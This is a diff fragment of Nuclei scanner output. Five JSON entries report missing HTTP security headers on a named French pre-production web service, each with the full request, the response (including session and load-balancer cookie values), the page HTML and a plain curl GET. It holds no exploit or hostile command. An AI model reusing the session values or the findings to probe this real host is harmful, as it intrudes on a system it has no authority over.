@@ -1,5 +1,413 @@
 [
   {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "referrer-policy",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.46596228Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "clear-site-data",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466569185Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "cross-origin-embedder-policy",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466605485Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "cross-origin-opener-policy",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466653485Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
+    "template": "misconfiguration/http-missing-security-headers.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/misconfiguration/http-missing-security-headers.yaml",
+    "template-id": "http-missing-security-headers",
+    "info": {
+      "name": "HTTP Missing Security Headers",
+      "author": [
+        "socketz",
+        "geeknik",
+        "g4l1t0",
+        "convisoappsec",
+        "kurohost",
+        "dawid-czarnecki"
+      ],
+      "tags": [
+        "misconfig",
+        "generic"
+      ],
+      "description": "It searches for missing security headers, but obviously, could be so less generic and could be useless for Bug Bounty.",
+      "reference": null,
+      "severity": "info"
+    },
+    "matcher-name": "access-control-max-age",
+    "type": "http",
+    "host": "https://siao-preprod.cegedim-hds.fr",
+    "matched-at": "https://siao-preprod.cegedim-hds.fr",
+    "request": "GET / HTTP/1.1\r\nHost: siao-preprod.cegedim-hds.fr\r\nUser-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
+    "response": "HTTP/1.1 200 \r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAccept-Ranges: bytes\r\nCache-Control: no-cache, no-store, max-age=0, must-revalidate\r\nContent-Language: en\r\nContent-Security-Policy: script-src 'self' code.jquery.com cdn.jsdelivr.net *.hs-scripts.com *.hs-banner.com *.hs-analytics.net *.hscollectedforms.net *.usemessages.com 'sha256-Ihbm16nGVdxMm/rbAVGyCDHqcoNYOjn0yfeXD93OF+E=' 'report-sample';  object-src 'none'; frame-ancestors 'none'; report-uri /api/csp-report;\r\nContent-Type: text/html;charset=UTF-8\r\nDate: Sun, 01 May 2022 04:56:45 GMT\r\nExpires: 0\r\nLast-Modified: Wed, 27 Apr 2022 08:41:11 GMT\r\nPragma: no-cache\r\nSet-Cookie: JSESSIONID=2B3B319C5E3184D1FC0881853E4CB505; HttpOnly; Path=/; Secure; HttpOnly\r\nSet-Cookie: serverTime=1651381005424; Path=/\r\nSet-Cookie: sessionExpiry=1651382805424; HttpOnly; Path=/; Secure\r\nSet-Cookie: BIGipServerpool-siao-preprod.cegedim-hds.fr-HTTP=!nqOVCJVHbTy9bkqsm7p0I5CraKeLeBqtl8XXHmuqJ/jWyfBnYa4SY133GRyia///sRIRL1QKKT/DpkFVjoPAqP3Q2m0=; path=/; Httponly; Secure\r\nStrict-Transport-Security: max-age=31536000; includeSubDomains\r\nVary: origin,access-control-request-method,access-control-request-headers,accept-encoding\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: DENY\r\nX-Xss-Protection: 1; mode=block\r\n\r\n<!DOCTYPE html>\n<html lang=\"fr\">\n\n<head>\n  <meta charset=\"utf-8\"/>\n  <base href=\"/\"/>\n  <title>SIAO - 115</title>\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/>\n  <meta name=\"theme-color\" content=\"#000091\"/>\n\n  <link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/@gouvfr/favicon/favicon.ico\"/>\n\n  <link rel=\"apple-touch-icon\" href=\"/@gouvfr/favicon/apple-touch-icon.png\"><!-- 180×180 -->\n  <link rel=\"icon\" href=\"/@gouvfr/favicon/favicon.svg\" type=\"image/svg+xml\">\n  <link rel=\"shortcut icon\" href=\"/@gouvfr/favicon/favicon.ico\" type=\"image/x-icon\"><!-- 32×32 -->\n  <link rel=\"manifest\" href=\"manifest.webmanifest\" crossorigin=\"use-credentials\">\n\n  <link rel=\"preload\" href=\"./primeicons.ttf\" as=\"font\" type=\"font/ttf\" crossorigin=\"anonymous\"/>\n  <link rel=\"preload\" href=\"./fontawesome-webfont.woff2?v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin=\"anonymous\"/>\n\n  <script>\n    // Options disponibles à l'initialisation du DSFR\n    window.dsfr = {\n      verbose: true,\n      mode: 'loaded'\n    };\n  </script>\n\n  <!-- Load the HubSpot tracking code -->\n  <script type=\"text/javascript\" id=\"hubspot-script-loader\" async=\"\" defer=\"\" src=\"https://js-eu1.hs-scripts.com/25326951.js\"></script>\n<link rel=\"stylesheet\" href=\"styles.880478b185bb98864d28.css\"><link rel=\"stylesheet\" href=\"dsfr-style.03dc4b3b7b4769413a79.css\"><link rel=\"stylesheet\" href=\"siao-style.b0562ea04b689bd3adff.css\"><link rel=\"stylesheet\" href=\"siao-dsfr-style.d13d91e14f4cbb660335.css\"><link rel=\"stylesheet\" href=\"font-awesome-style.08a29c2fc078cee582bb.css\"><link rel=\"stylesheet\" href=\"isteven-style.0edfa9e05c41349db347.css\"><link rel=\"stylesheet\" href=\"leaflet-style.ee729732fa52604c13fe.css\"><link rel=\"stylesheet\" href=\"quill-core-style.5cd273368752aa4fe749.css\"><link rel=\"stylesheet\" href=\"quill-snow-style.aa0d982acd667f171798.css\"></head>\n\n<body>\n  <siao-app></siao-app>\n<script src=\"runtime-es2015.596b7e70e61ddc690c6f.js\" type=\"module\"></script><script src=\"runtime-es5.596b7e70e61ddc690c6f.js\" nomodule defer></script><script src=\"polyfills-es5.44ee96163fd08b4f1543.js\" nomodule defer></script><script src=\"polyfills-es2015.659acdc4e17d34e8cd39.js\" type=\"module\"></script><script src=\"scripts.7e3c12780cbda2cc3f17.js\" defer></script><script src=\"vendor-es2015.d9b09acd32351b9c9da4.js\" type=\"module\"></script><script src=\"vendor-es5.d9b09acd32351b9c9da4.js\" nomodule defer></script><script src=\"main-es2015.be5f1f53f526be8f523a.js\" type=\"module\"></script><script src=\"main-es5.be5f1f53f526be8f523a.js\" nomodule defer></script></body>\n\n</html>\n",
+    "ip": "185.113.40.47",
+    "timestamp": "2022-05-01T04:56:45.466683485Z",
+    "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)' 'https://siao-preprod.cegedim-hds.fr'",
+    "matcher-status": true,
+    "matched-line": null
+  },
+  {
